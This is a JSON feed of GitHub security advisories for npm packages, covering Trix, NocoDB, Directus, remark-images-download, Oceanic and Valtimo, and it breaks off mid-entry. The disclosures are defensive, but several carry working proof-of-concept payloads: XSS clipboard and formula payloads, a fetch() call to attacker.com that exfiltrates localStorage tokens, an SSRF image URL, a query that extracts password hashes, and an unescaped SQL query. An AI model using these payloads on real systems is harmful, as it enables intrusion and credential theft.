{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>\n<p><strong>Vulnerable Versions</strong>: </p>\n<ul>\n<li>1.x series up to and including 1.3.1</li>\n<li>2.x series up to and including 2.1.0</li>\n</ul>\n<p><strong>Fixed Versions</strong>: </p>\n<ul>\n<li>v1.3.2</li>\n<li>v2.1.1</li>\n</ul>\n<p><strong>Vector</strong>:</p>\n<ul>\n<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>\n</ul>\n<pre><code class=\"language-js\">document.addEventListener('copy', function(e){\n  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class=\"123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//\"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');\n  e.preventDefault();\n});\n</code></pre>\n<p>and pasting into the Trix editor, the script within the content is executed.</p>\n<ul>\n<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>\n</ul>\n<pre><code class=\"language-js\">document.write(`copy&lt;div data-trix-attachment=\"{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}\"&gt;&lt;/div&gt;me`);\n</code></pre>\n<h3 id=\"impact\">Impact:</h3>\n<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>\n<h3 id=\"remediation\">Remediation:</h3>\n<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>\n<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>\n<h3 id=\"references\">References:</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/releases/tag/v2.1.1\">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1147\">https://github.com/basecamp/trix/pull/1147</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1149\">https://github.com/basecamp/trix/pull/1149</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1153\">https://github.com/basecamp/trix/pull/1153</a></li>\n</ul>\n<p><strong>Credit</strong>: These issues were reported by security researchers <a href=\"https://hackerone.com/loknop\">loknop</a> and <a href=\"https://hackerone.com/pinpie\">pinpie</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99\">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1147\">https://github.com/basecamp/trix/pull/1147</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1149\">https://github.com/basecamp/trix/pull/1149</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad\">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554\">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>\n<li><a href=\"https://github.com/basecamp/trix/releases/tag/v2.1.1\">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34341\">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjqp-xr96-cj99\">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qjqp-xr96-cj99",
            "title": "[trix] Trix Editor Arbitrary Code Execution Vulnerability",
            "date_modified": "2024-05-15T14:20:38.000Z",
            "date_published": "2024-05-07T16:49:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qjqp-xr96-cj99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>\n<p><strong>Vulnerable Versions</strong>: </p>\n<ul>\n<li>1.x series up to and including 1.3.1</li>\n<li>2.x series up to and including 2.1.0</li>\n</ul>\n<p><strong>Fixed Versions</strong>: </p>\n<ul>\n<li>v1.3.2</li>\n<li>v2.1.1</li>\n</ul>\n<p><strong>Vector</strong>:</p>\n<ul>\n<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>\n</ul>\n<pre><code class=\"language-js\">document.addEventListener('copy', function(e){\n  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class=\"123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//\"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');\n  e.preventDefault();\n});\n</code></pre>\n<p>and pasting into the Trix editor, the script within the content is executed.</p>\n<ul>\n<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>\n</ul>\n<pre><code class=\"language-js\">document.write(`copy&lt;div data-trix-attachment=\"{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}\"&gt;&lt;/div&gt;me`);\n</code></pre>\n<h3 id=\"impact\">Impact:</h3>\n<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>\n<h3 id=\"remediation\">Remediation:</h3>\n<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>\n<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>\n<h3 id=\"references\">References:</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/releases/tag/v2.1.1\">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1147\">https://github.com/basecamp/trix/pull/1147</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1149\">https://github.com/basecamp/trix/pull/1149</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1153\">https://github.com/basecamp/trix/pull/1153</a></li>\n</ul>\n<p><strong>Credit</strong>: These issues were reported by security researchers <a href=\"https://hackerone.com/loknop\">loknop</a> and <a href=\"https://hackerone.com/pinpie\">pinpie</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99\">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1147\">https://github.com/basecamp/trix/pull/1147</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1149\">https://github.com/basecamp/trix/pull/1149</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad\">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554\">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>\n<li><a href=\"https://github.com/basecamp/trix/releases/tag/v2.1.1\">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34341\">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjqp-xr96-cj99\">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qjqp-xr96-cj99",
            "title": "[trix] Trix Editor Arbitrary Code Execution Vulnerability",
            "date_modified": "2024-05-15T14:20:38.000Z",
            "date_published": "2024-05-07T16:49:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qjqp-xr96-cj99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A major blind SSRF has been found in <code>remark-images-download</code>, which allowed\nfor requests to be made to neighboring servers on local IP ranges.\nThe issue came from a loose filtering of URLs inside the module.</p>\n<p>Imagine a server running on a private network <code>192.168.1.0/24</code>.\nA private service serving images is running on <code>192.168.1.2</code>, and\nis not expected to be accessed by users. A machine is running\n<code>remark-images-download</code> on the neighboring <code>192.168.1.3</code> host.\nAn user enters the following Markdown:</p>\n<pre><code class=\"language-markdown\">![](http://192.168.1.2/private-img.png)\n</code></pre>\n<p>The image is downloaded by the server and included inside the resulting\ndocument. Hence, the user has access to the private image.</p>\n<p>It has been corrected by preventing images downloads from\nlocal IP ranges, both in IPv4 and IPv6.\nTo avoid malicious domain names, resolved local IPs from are also\nforbidden inside the module.\nThis vulnerability impact is moderate, as it is can allow access to\nunexposed documents on the local network, and is very easy\nto exploit.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in version 3.1.0.\nIf impacted, you should update to this version as soon as possible.</p>\n<p>Please note that a minor version has been released instead of a bugfix.\nThis is due to a new option included to prevent another vulnerability,\nupgrading to the new version will not break compatibility.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround is known, the package should be upgraded.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, open an issue in <a href=\"https://github.com/zestedesavoir/zmarkdown/issues\">ZMarkdown</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zestedesavoir/zmarkdown/security/advisories/GHSA-mf74-qq7w-6j7v\">https://github.com/zestedesavoir/zmarkdown/security/advisories/GHSA-mf74-qq7w-6j7v</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mf74-qq7w-6j7v\">https://github.com/advisories/GHSA-mf74-qq7w-6j7v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mf74-qq7w-6j7v",
            "title": "[remark-images-download] Zmarkdown Server-Side Request Forgery (SSRF) in remark-download-images",
            "date_modified": "2024-05-14T22:02:20.000Z",
            "date_published": "2024-02-03T00:38:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mf74-qq7w-6j7v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Konga v0.14.9 is vulnerable to Cross Site Scripting (XSS) via the username parameter.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34243\">https://nvd.nist.gov/vuln/detail/CVE-2024-34243</a></li>\n<li><a href=\"https://github.com/JByteL/CVE/tree/main/CVE-2024-34243\">https://github.com/JByteL/CVE/tree/main/CVE-2024-34243</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93pf-mrc8-4g3h\">https://github.com/advisories/GHSA-93pf-mrc8-4g3h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93pf-mrc8-4g3h",
            "title": "[kongadmin] Konga is vulnerable to Cross Site Scripting (XSS) attacks",
            "date_modified": "2024-05-14T21:47:55.000Z",
            "date_published": "2024-05-14T18:31:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93pf-mrc8-4g3h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Input to functions such as <code>Client.rest.channels.removeBan</code> is not url-encoded, resulting in specially crafted input such as <code>../../../channels/{id}</code> being normalized into the url <code>/api/v10/channels/{id}</code>, and deleting a channel rather than removing a ban.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Sanitizing user input, ensuring strings are valid for the purpose they are being used for.</li>\n<li>Encoding input with <code>encodeURIComponent</code> before providing it to the library.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>OceanicJS/Oceanic@8bf8ee8373b8c565fbdbf70a609aba4fbc1a1ffe</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OceanicJS/Oceanic/security/advisories/GHSA-5h5v-hw44-f6gg\">https://github.com/OceanicJS/Oceanic/security/advisories/GHSA-5h5v-hw44-f6gg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34712\">https://nvd.nist.gov/vuln/detail/CVE-2024-34712</a></li>\n<li><a href=\"https://github.com/OceanicJS/Oceanic/commit/8bf8ee8373b8c565fbdbf70a609aba4fbc1a1ffe\">https://github.com/OceanicJS/Oceanic/commit/8bf8ee8373b8c565fbdbf70a609aba4fbc1a1ffe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5h5v-hw44-f6gg\">https://github.com/advisories/GHSA-5h5v-hw44-f6gg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5h5v-hw44-f6gg",
            "title": "[oceanic.js] Oceanic allows unsanitized user input to lead to path traversal in URLs",
            "date_modified": "2024-05-14T20:14:00.000Z",
            "date_published": "2024-05-14T20:13:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5h5v-hw44-f6gg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Currently session tokens function like the other JWT tokens where they are not actually invalidated when logging out. The <code>directus_session</code> gets destroyed and the cookie gets deleted but if you captured the cookie value it will still work for the entire expiry time which is set to 1 day by default. Making it effectively a long lived unrevokable stateless token instead of the stateful session token it was meant to be.\nWhen authenticating a session token JWT, Directus should also check whether the associated <code>directus_session</code> both still exists and has not expired (although the token should expire at the same time or before the session) to ensure leaked tokens are not valid indefinitely.</p>\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n<ul>\n<li>Copy the current session token from the cookie</li>\n<li>Refresh and or log out</li>\n<li>Use the saved session token to check if it is still valid</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>The lack of proper session expiration may improve the likely success of certain attacks. For example, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Incorrect token invalidation could allow an attacker to use the browser's history to access a Directus instance session previously accessed by the victim.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-g65h-35f3-x2w3\">https://github.com/directus/directus/security/advisories/GHSA-g65h-35f3-x2w3</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/a6172f8a6a0f31a6bf4305a090de172ebfb63bcf\">https://github.com/directus/directus/commit/a6172f8a6a0f31a6bf4305a090de172ebfb63bcf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34709\">https://nvd.nist.gov/vuln/detail/CVE-2024-34709</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g65h-35f3-x2w3\">https://github.com/advisories/GHSA-g65h-35f3-x2w3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g65h-35f3-x2w3",
            "title": "[directus] Directus Lacks Session Tokens Invalidation",
            "date_modified": "2024-05-14T20:04:31.000Z",
            "date_published": "2024-05-13T19:59:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g65h-35f3-x2w3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A stored cross-site scripting vulnerability exists within the Formula virtual cell comments functionality.</p>\n<h3 id=\"details\">Details</h3>\n<p>The nc-gui/components/virtual-cell/Formula.vue displays a v-html tag with the value of \"urls\" whose contents are processed by the function replaceUrlsWithLink(). This function recognizes the pattern URI::(XXX) and creates a hyperlink tag <a> with href=XXX. However, it leaves all the other contents outside of the pattern URI::(XXX) unchanged, which makes the evil users can create a malicious table with a formula field whose payload is &lt;img src=1 onerror=\"malicious javascripts\"URI::(XXX). The evil users then can share this table with others by enabling public viewing and the victims who open the shared link can be attacked.</a></p><a>\n<h3 id=\"poc\">PoC</h3>\n<p>Step 1: Attacker login the nocodb and creates a table with two fields, \"T\" and \"F\". The type of field \"T\" is \"SingleLineText\", and the type of the \"F\" is \"Fomula\" with the formula content {T}\nStep 2: The attacker sets the contents of T using &lt;img src=1 onerror=alert(localStorage.getItem('nocodb-gui-v2'))URI::(XXX)\nStep 3: The attacker clicks the \"Share\" button and enables public viewing, then copies the shared link and sends it to the victims\nStep 4: Any victims who open the shared link in their browsers will see the alert with their confidential tokens stored in localStorage</p>\n</a><p><a>The attackers can use the fetch(</a><a href=\"http://attacker.com/?localStorage.getItem(%27nocodb-gui-v2%27)\">http://attacker.com/?localStorage.getItem('nocodb-gui-v2')</a>) to replace the alert and then steal the victims' credentials in their attacker.com website.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Stealing the credentials of NocoDB user that clicks the malicious link.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nocodb/nocodb/security/advisories/GHSA-h6r4-xvw6-jc5h\">https://github.com/nocodb/nocodb/security/advisories/GHSA-h6r4-xvw6-jc5h</a></li>\n<li><a href=\"https://github.com/nocodb/nocodb/commit/7f58ce3726dfec71537d8b80474a0f95a48a1574\">https://github.com/nocodb/nocodb/commit/7f58ce3726dfec71537d8b80474a0f95a48a1574</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49781\">https://nvd.nist.gov/vuln/detail/CVE-2023-49781</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h6r4-xvw6-jc5h\">https://github.com/advisories/GHSA-h6r4-xvw6-jc5h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h6r4-xvw6-jc5h",
            "title": "[nocodb] NocoDB Vulnerable to Stored Cross-Site Scripting in Formula.vue",
            "date_modified": "2024-05-14T18:05:54.000Z",
            "date_published": "2024-05-13T19:59:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h6r4-xvw6-jc5h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>A user with permission to view any collection using redacted hashed fields can get access the raw stored version using the <code>alias</code> functionality on the API.\nNormally, these redacted fields will return <code>**********</code> however  if we change the request to <code>?alias[workaround]=redacted</code> we can instead retrieve the plain text value for the field.</p>\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n<ul>\n<li>Set up a simple role with read-access to users.</li>\n<li>Create a new user with the role from the previous step</li>\n<li>Assign a password to the user</li>\n</ul>\n<p>The easiest way to confirm this vulnerability is by first visiting <code>/users/me</code>. You should be presented with a redacted JSON-object.\nNext, visit <code>/users/me?alias[hash]=password</code>. This time, the returned JSON object will included the raw password hash instead of the redacted value.</p>\n<h2 id=\"workaround\">Workaround</h2>\n<p>This can be avoided by removing permission to view the sensitive fields entirely from users or roles that should not be able to see them.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-p8v3-m643-4xqx\">https://github.com/directus/directus/security/advisories/GHSA-p8v3-m643-4xqx</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/e70a90c267bea695afce6545174c2b77517d617b\">https://github.com/directus/directus/commit/e70a90c267bea695afce6545174c2b77517d617b</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34708\">https://nvd.nist.gov/vuln/detail/CVE-2024-34708</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p8v3-m643-4xqx\">https://github.com/advisories/GHSA-p8v3-m643-4xqx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p8v3-m643-4xqx",
            "title": "[directus] Directus allows redacted data extraction on the API through \"alias\"",
            "date_modified": "2024-05-14T20:04:23.000Z",
            "date_published": "2024-05-13T19:40:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p8v3-m643-4xqx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<hr>\n<p>An authenticated attacker with create access could conduct a SQL Injection attack on MySQL DB using unescaped table_name.</p>\n<h3 id=\"details\">Details</h3>\n<hr>\n<h3 id=\"sql-injection-vulnerability-occurs-in-vitessclientts\">SQL Injection vulnerability occurs in <strong>VitessClient.ts</strong>.</h3>\n<pre><code class=\"language-javascript\">async columnList(args: any = {}) {\n    const func = this.columnList.name;\n    const result = new Result();\n    log.api(`${func}:args:`, args);\n\n    try {\n      args.databaseName = this.connectionConfig.connection.database;\n\n      const response = await this.sqlClient.raw(\n        `select *, table_name as tn from information_schema.columns where table_name = '${args.tn}' ORDER by ordinal_position`,\n      );\n</code></pre>\n<p>The variable <strong>${args.tn}</strong> refers to the table name entered by the user.\nA malicious attacker can escape the existing query by including a special character (') in the table name and insert and execute a new arbitrary SQL query.</p>\n<h3 id=\"impact\">Impact</h3>\n<hr>\n<p>This vulnerability may result in leakage of sensitive data in the database.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nocodb/nocodb/security/advisories/GHSA-8fxg-mr34-jqr8\">https://github.com/nocodb/nocodb/security/advisories/GHSA-8fxg-mr34-jqr8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50718\">https://nvd.nist.gov/vuln/detail/CVE-2023-50718</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8fxg-mr34-jqr8\">https://github.com/advisories/GHSA-8fxg-mr34-jqr8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8fxg-mr34-jqr8",
            "title": "[nocodb] NocoDB SQL Injection vulnerability",
            "date_modified": "2024-05-14T18:06:13.000Z",
            "date_published": "2024-05-13T16:46:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8fxg-mr34-jqr8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<hr>\n<p>Attacker can upload a html file with malicious content. If user tries to open that file in browser malicious scripts can be executed leading  Stored XSS(Cross-Site Script) attack.</p>\n<h3 id=\"poc\">PoC</h3>\n<hr>\n<p>NocoDB was configured using the Release Binary <code>Noco-macos-arm64</code>, and nocodb version 0.202.9 (currently the latest version) was used.\nbinary hash infos: md5(164b727f287af56168bc16fba622d0b4) / sha256(43e8e97f4c5f5330613abe071a359f84e4514b7186f92954b678087c37b7832e)\n<img src=\"https://user-images.githubusercontent.com/86613161/287472673-aeb60a02-2080-429f-8583-9f130ab62779.png\" alt=\"image\" width=\"665\"></p>\n<h3 id=\"1-run-the-binary-to-start-the-server-and-access-the-arbitrary-table-dashboard\">1. Run the binary to start the server and access the arbitrary table dashboard.</h3>\n<img src=\"https://user-images.githubusercontent.com/86613161/287472852-98b2286e-ad66-45bf-b503-63780619d775.png\" alt=\"image\" width=\"830\">\n\n<p>Here, used the default <code>Features</code> table.</p>\n<h3 id=\"2-click--in-the-table-field-header-to-add-an-attachment-field\">2. Click <code>+</code> in the table <code>field header</code> to add an <code>attachment</code> field.</h3>\n<img src=\"https://user-images.githubusercontent.com/86613161/287472936-98a67213-a547-4e71-915c-d2a43300530b.png\" alt=\"image\" width=\"1173\">\n\n<h3 id=\"3-click-the-add-files-button-to-select-and-upload-files\">3. Click the <code>Add File(s)</code> button to select and upload files.</h3>\n<img src=\"https://user-images.githubusercontent.com/86613161/287473041-0801ff39-e48c-4746-8518-be825bfd5533.png\" alt=\"image\" width=\"1132\">\n\n<p>Here, <code>test.html</code> containing <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> was uploaded.</p>\n<h3 id=\"4-check-the-uploaded-file-path\">4. Check the uploaded file path.</h3>\n<p>&lt;img width=\"1163\" alt=\"image\" src=\"<a href=\"https://user-images.githubusercontent.com/86613161/287473337-b1c7c781-2fb5-4bd0-b464-dbd3d4158f04.png\">https://user-images.githubusercontent.com/86613161/287473337-b1c7c781-2fb5-4bd0-b464-dbd3d4158f04.png</a>\"</p>\n<h3 id=\"5-access-the-uploaded-file-path\">5. Access the uploaded file path.</h3>\n<img src=\"https://user-images.githubusercontent.com/86613161/287473278-410f9228-58e3-4ee4-b111-70cdbffa9ed5.png\" alt=\"image\" width=\"1201\">\n\n<p>When the file path is accessed, the <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> script statement contained in the file is executed and the server host appears in the alert message.</p>\n<h3 id=\"impact\">Impact</h3>\n<hr>\n<p>This allows remote attacker to execute JavaScript code in the context of the user accessing the vector. An attacker could have used this vulnerability to execute requests in the name of a logged-in user or potentially collect information about the attacked user by displaying a malicious form.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nocodb/nocodb/security/advisories/GHSA-qg73-g3cf-vhhh\">https://github.com/nocodb/nocodb/security/advisories/GHSA-qg73-g3cf-vhhh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50717\">https://nvd.nist.gov/vuln/detail/CVE-2023-50717</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qg73-g3cf-vhhh\">https://github.com/advisories/GHSA-qg73-g3cf-vhhh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qg73-g3cf-vhhh",
            "title": "[nocodb] NocoDB Allows Preview of Files with Dangerous Content",
            "date_modified": "2024-05-14T18:06:03.000Z",
            "date_published": "2024-05-13T16:46:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qg73-g3cf-vhhh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>\n<p>This issue is caused by a misconfiguration of the Form.io component.</p>\n<h3 id=\"attack-requirements\">Attack requirements</h3>\n<p>The following conditions have to be met in order to perform this attack:</p>\n<ul>\n<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>\n<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>\n<li>An attacker needs to have network access to the Valtimo API.</li>\n<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r\">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34706\">https://nvd.nist.gov/vuln/detail/CVE-2024-34706</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcp4-62vj-cq3r\">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcp4-62vj-cq3r",
            "title": "[@valtimo/components] @valtimo/components exposes access token to form.io",
            "date_modified": "2024-05-14T20:04:06.000Z",
            "date_published": "2024-05-13T16:04:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcp4-62vj-cq3r"
            },
            "tags": [
                "severity"
            ]
        },
        {
